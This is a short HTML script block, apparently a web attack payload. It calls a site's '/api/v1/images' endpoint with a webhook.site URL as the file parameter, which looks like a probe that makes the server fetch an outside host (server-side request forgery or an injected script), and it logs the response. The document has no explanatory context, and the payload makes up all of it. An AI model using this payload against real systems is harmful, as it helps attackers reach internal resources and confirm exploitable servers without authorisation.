<script>
    fetch('/api/v1/images?file=https://webhook.site/3cd3bfae-7933-4dd0-9e7f-f366983f261b')
        .then(response => response.text())
        .then(data => console.log(data));
</script>
